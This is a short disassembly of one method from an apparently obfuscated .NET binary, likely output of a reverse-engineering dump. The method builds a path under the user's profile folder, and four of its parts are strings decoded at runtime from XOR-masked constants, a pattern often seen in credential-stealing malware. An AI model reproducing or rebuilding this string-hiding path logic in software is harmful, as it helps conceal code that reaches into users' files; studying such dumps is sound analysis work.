# token=060028C1 rva=20537C name=SumScopeChooser source=dump_full grp=gfp
# {'ilsize': 165, 'maxstack': 9, 'eh': 0}
  IL_0000  ldc.i4.s 0x28
  IL_0002  call 0xa000159   ; MemberRef:System.Environment::GetFolderPath
  IL_0007  stloc.s 0x2
  IL_0009  br IL_000e
  IL_000E  ldc.i4.1
  IL_000F  newarr 0x100000a   ; TypeRef:System.String
  IL_0014  dup
  IL_0015  ldc.i4.0
  IL_0016  ldc.i4.5
  IL_0017  newarr 0x100000a   ; TypeRef:System.String
  IL_001C  dup
  IL_001D  ldc.i4.0
  IL_001E  ldloc.s 0x2
  IL_0020  stelem.ref
  IL_0021  dup
  IL_0022  ldc.i4.1
  IL_0023  ldc.i4 0xcca9c5c9
  IL_0028  ldc.i4 0xcd72c2a3
  IL_002D  xor
  IL_002E  ldsfld 0x40020b8   ; Field:20B8
  IL_0033  ldfld 0x40020fc   ; Field:20FC
  IL_0038  xor
  IL_0039  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_003E  stelem.ref
  IL_003F  dup
  IL_0040  ldc.i4.2
  IL_0041  ldc.i4 0x97d40b94
  IL_0046  ldc.i4 0xbf25ece1
  IL_004B  xor
  IL_004C  ldsfld 0x40020b8   ; Field:20B8
  IL_0051  ldfld 0x4002099   ; Field:2099
  IL_0056  xor
  IL_0057  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_005C  stelem.ref
  IL_005D  dup
  IL_005E  ldc.i4.3
  IL_005F  ldc.i4 0xcc121a1d
  IL_0064  ldc.i4 0xba5f9d22
  IL_0069  xor
  IL_006A  ldsfld 0x40020b8   ; Field:20B8
  IL_006F  ldfld 0x40020e8   ; Field:20E8
  IL_0074  xor
  IL_0075  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_007A  stelem.ref
  IL_007B  dup
  IL_007C  ldc.i4.4
  IL_007D  ldc.i4 0x8b7d7b6a
  IL_0082  ldc.i4 0xa3996bbc
  IL_0087  xor
  IL_0088  ldsfld 0x40020b8   ; Field:20B8
  IL_008D  ldfld 0x4002092   ; Field:2092
  IL_0092  xor
  IL_0093  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_0098  stelem.ref
  IL_0099  ldsfld 0x4002786   ; Field:2786
  IL_009E  call 0x6005fb0   ; MethodDef:ExecuteExplorer
  IL_00A3  stelem.ref
  IL_00A4  ret
